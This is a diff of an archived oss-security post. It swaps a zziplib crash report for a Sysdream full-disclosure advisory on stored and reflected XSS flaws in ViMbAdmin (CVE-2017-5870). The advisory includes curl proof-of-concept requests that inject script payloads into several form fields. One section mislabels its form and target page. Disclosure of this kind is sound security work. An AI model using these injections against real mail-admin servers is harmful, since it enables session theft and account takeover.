@@ -1,68 +1,130 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/09/13
-Message-ID: <4365957.OJeqqsgQBT@blackgate>
-Date: Thu, 09 Feb 2017 14:45:49 +0100
-From: Agostino Sarubbo <ago@...too.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/03/8
+Message-ID: <f9bad8be-8624-09e5-a6ea-a3d56a715d39@sysdream.com>
+Date: Wed, 3 May 2017 16:03:48 +0200
+From: Sysdream Labs <labs@...dream.com>
 To: oss-security@...ts.openwall.com
-Subject: zziplib: NULL pointer dereference in main (unzzipcat-mem.c)
+Cc: fulldisclosure@...lists.org
+Subject: [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin
 Content-Type: text/plain; charset=utf-8
 
-Description:
-zziplib is an intentionally lightweight library that offers the ability to 
-easily extract data from files archived in a single zip file.
+# [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin
 
-A fuzz on it discovered an a NULL pointer access.
+## Product Description
 
-The complete ASan output:
+ViMbAdmin is a web-based interface used to manage a mail server with virtual domains, mailboxes and aliases. It is an open source solution developed by Opensolutions and distributed under the GNU/GPL license version 3. The official web site can be found at www.vimbadmin.net.
 
-# unzzipcat-mem $FILE
-==7919==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000008 (pc 
-0x7f9a138fb59a bp 0x7ffe1c0b0050 sp 0x7ffe1c0aff78 T0)
-==7919==The signal is caused by a READ memory access.
-==7919==Hint: address points to the zero page.
-    #0 0x7f9a138fb599 in strlen /var/tmp/portage/sys-libs/glibc-2.22-
-r4/work/glibc-2.22/string/../sysdeps/x86_64/strlen.S:76
-    #1 0x7f9a138e47ab in _IO_puts /var/tmp/portage/sys-libs/glibc-2.22-
-r4/work/glibc-2.22/libio/ioputs.c:36
-    #2 0x509c8b in main /tmp/portage/dev-libs/zziplib-0.13.62-
-r1/work/zziplib-0.13.62/bins/unzzipcat-mem.c:94:6
-    #3 0x7f9a1389a61f in __libc_start_main /var/tmp/portage/sys-
-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
-    #4 0x419748 in _init (/usr/bin/unzzipcat-mem+0x419748)
+## Details
 
-AddressSanitizer can not provide additional info.
-SUMMARY: AddressSanitizer: SEGV /var/tmp/portage/sys-libs/glibc-2.22-
-r4/work/glibc-2.22/string/../sysdeps/x86_64/strlen.S:76 in strlen
-==7919==ABORTING
+**CVE ID**: CVE-2017-5870
+    
+**Access Vector**: remote
 
-Affected version:
-0.13.62
+**Security Risk**: high
 
-Fixed version:
-N/A
+**Vulnerability**: CWE-79
 
-Commit fix:
-N/A
+**CVSS Base Score**: 7.2
 
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
+**CVSS vector**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
 
-CVE:
-N/A
 
-Reproducer:
-https://github.com/asarubbo/poc/blob/master/00155-zziplib-nullptr-main
+## Proof of Concept
 
-Timeline:
-2017-01-17: bug discovered and poked upstream
-2017-02-09: blog post about the issue
+### Domain creation form
 
-Note:
-This bug was found with American Fuzzy Lop.
+#### Exploit
 
-Permalink:
-https://blogs.gentoo.org/ago/2017/02/09/zziplib-null-pointer-dereference-in-main-unzzipcat-mem-c
+The domain creation form is vulnerable to a stored XSS vulnerability, through the `domain` and `transport` variables:
+
+```
+curl 'http://<ip>/domain/add' -H 'Cookie: VIMBADMIN3=<SESSIONID>;' --data 'domain=testdomain%22%3E%3Cscript%3Ealert%28%27xss domain%27%29%3C%2Fscript%3E&description=none&backupmx=0&active=0&active=1&max_aliases=0&max_mailboxes=0&transport=virtual%22%3E%3Cscript%3Ealert%28%27XSS virtual%27%29%3C%2Fscript%3E' --compressed ;
+```
+
+The payload gets injected inside the `http://<ip>/domain/list` page.
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/DomainController.php` file.
+
+### Mailbox creation form
+
+#### Exploit
+
+The mailbox creation form is vulnerable to a stored XSS vulnerability, in the `name` variable:
+
+```
+curl 'http://mailadmin.commeun.ninja/mailbox/add/did/<domain id>' -H 'Cookie: VIMBADMIN3=<SESSIONID>' --data 'local_part=test&domain=<domain id>&name=test%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&password=<password>&quota=0&alt_email=&cc_welcome_email='
+```
+
+The payload gets injected inside the `http://<ip>/mailbox/list` page.
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/MailboxController.php` file.
+
+### Alias creation form
+
+#### Exploit
+
+The alias creation form is vulnerable to a stored XSS vulnerability, in the `goto` variable:
+
+```
+curl 'http://<ip>/alias/add/did/<domain id>' -H 'Cookie: VIMBADMIN3=<SESSIONID>' --data 'local_part=test&domain=4&goto%5B%5D=test%40test.com%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
+```
+
+The payload gets injected inside the `http://<ip>/alias` page.
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/AliasController.php` file.
+
+### On reset password page
+
+#### Exploit
+
+A reflected XSS vulnerability has been found on the alias creation form, using variables `captchatext`.
+
+```
+curl 'http://<ip>/auth/lost-password' --data 'username=none&captchaid=<captcha id>&requestnewimage=0&captchatext=none%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&login=Reset+Password'
+
+```
+
+The payload gets injected inside the `http://<ip>/alias` page.
+
+#### Vulnerable code
+
+The vulnerable code is located in the `_getFormLostPassword()` method of the `<vimbadmin directory>/application/controllers/AuthController.php` file.
+
+## Affected version
+
+* tested on version 3.0.15
+
+## Timeline (dd/mm/yyyy)
+
+* 22/01/2017 : Initial discovery.
+* 16/02/2017 : First contact with opensolutions.io
+* 16/02/2017 : Advisory sent.
+* 24/02/2017 : Reply from the owner, acknowledging the report and planning to fix the vulnerabilities.
+* 13/03/2017 : Sysdream Labs request for an update.
+* 29/03/2017 : Second request for an update.
+* 29/03/2017 : Reply from the owner stating that he has no time to fix the issues.
+* 03/05/2017 : Full disclosure.
+
+## Credits
+
+* Florian NIVETTE, Sysdream (f.nivette -at- sysdream -dot- com)
 
 -- 
-Agostino Sarubbo
-Gentoo Linux Developer
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
